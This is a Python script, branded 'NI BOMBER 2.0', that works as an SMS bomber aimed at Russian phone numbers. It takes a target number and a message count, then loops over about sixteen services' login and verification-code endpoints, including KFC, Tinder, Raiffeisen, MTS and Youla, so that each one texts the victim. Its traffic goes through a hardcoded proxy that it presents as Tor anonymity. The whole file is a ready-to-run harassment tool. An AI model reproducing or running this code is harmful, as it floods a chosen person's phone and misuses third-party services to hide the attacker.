import requests
import datetime

class color:
	Green = '\033[92m'
	Cyan = '\033[95m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'
	END = '\033[0m'

print(color.Green + color.BOLD + '     ' + color.UNDERLINE + '[NI BOMBER 2.0]' + color.END)
print(color.Cyan + color.BOLD + "-"*25 + color.END)
print(color.Cyan + color.BOLD + '| coded by  | nikait    |\n' + '| telegram: | @aaanikit |' + color.END)
print(color.Cyan + color.BOLD + "-"*25 + color.END)
print('')


print('введите номер без префиксов\nпример: 9018017010')
number = input(color.Green + color.BOLD + '>> ' + color.END)
print('сколько sms отправить?')
sms = int(input(color.Green + color.BOLD + '>> ' + color.END))

def time(sent):
	a = datetime.datetime.now()
	time = (str(a.hour) + ':' + str(a.minute) + ':' +str(a.second))
	print('[' + color.Green + color.BOLD + str(time) + color.END + ']' + ' - ' + color.Green + color.BOLD + str(sent) + color.END + ' sms sent!')

def check_number(number):
	try:
		int(len(number)) == 10
		int(number[1]) == 9
		print('[*]check number -' + color.Green + color.BOLD + ' OK' + color.END)
	except:
		print('неправильный номер')
check_number(number)

def check(sent, sms):
	if sent == sms:
		quit()

print('[*]запуск ' + color.Cyan + color.BOLD + 'Tor' + color.END + '...')

proxies = {
    'http': 'socks5://139.59.53.105:1080',
    'https': 'socks5://139.59.53.105:1080'
}

tor = requests.get('http://icanhazip.com/', proxies=proxies).text
tor = (tor.replace('\n',''))

print('[*]запуск ' + color.Cyan + color.BOLD + 'Tor' + color.END + ' - ' +  color.Green + color.BOLD + 'OK ваше очко в безопасности' + color.END)

def attack(number, sms):
	number_7 = str(7) + number
	number_plus7 = str(+7) + number
	number_8 = str(8) + number
	sent = 0
	
	while True:
		requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": number_7, "type": 2})
		
		sent += 1
		time(sent)
		check(sent,sms)
		
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7})
		
		sent += 1
		time(sent)
		check(sent,sms)
		
		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": number_7})
		
		sent += 1
		time(sent)
		check(sent,sms)
		
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"})
		
		sent += 1
		time(sent)
		check(sent,sms)
		
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7})
		
		sent += 1
		time(sent)
		check(sent,sms)
		
		utair = requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers = {})
		
		sent += 1
		time(sent)
		check(sent,sms)
		
		tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
		data = {"phone_number":number_7},
		headers = {})
		
		sent += 1
		time(sent)
		check(sent,sms)
		
		citilink = requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/')
		
		sent += 1
		time(sent)
		check(sent,sms)
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", 
		data = {"st.r.phone": number_plus7})
		
		sent += 1
		time(sent)
		check(sent,sms)
		
		rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': number}).json()["res"]
		
		sent += 1
		time(sent)
		check(sent, sms)
		
		karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers = {})
		
		sent += 1
		time(sent)
		check(sent, sms)
		
		youdrive = requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'}, headers = {})
		
		sent += 1
		time(sent)
		check(sent, sms)
		
		sunlight = requests.post('https://api.sunlight.net/v3/customers/authorization/', json = {"phone":number_7}, headers = {})
		
		sent += 1
		time(sent)
		check(sent, sms)
		
		raiffeisen = requests.get('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code', params={'number':number_7})
		
		sent += 1
		time(sent)
		check(sent, sms)
		
		mts = requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers={})
		
		sent += 1
		time(sent)
		check(sent, sms)
		
		youla = requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7},headers = {})
		
		sent += 1
		time(sent)
		check(sent, sms)
attack(number, sms)
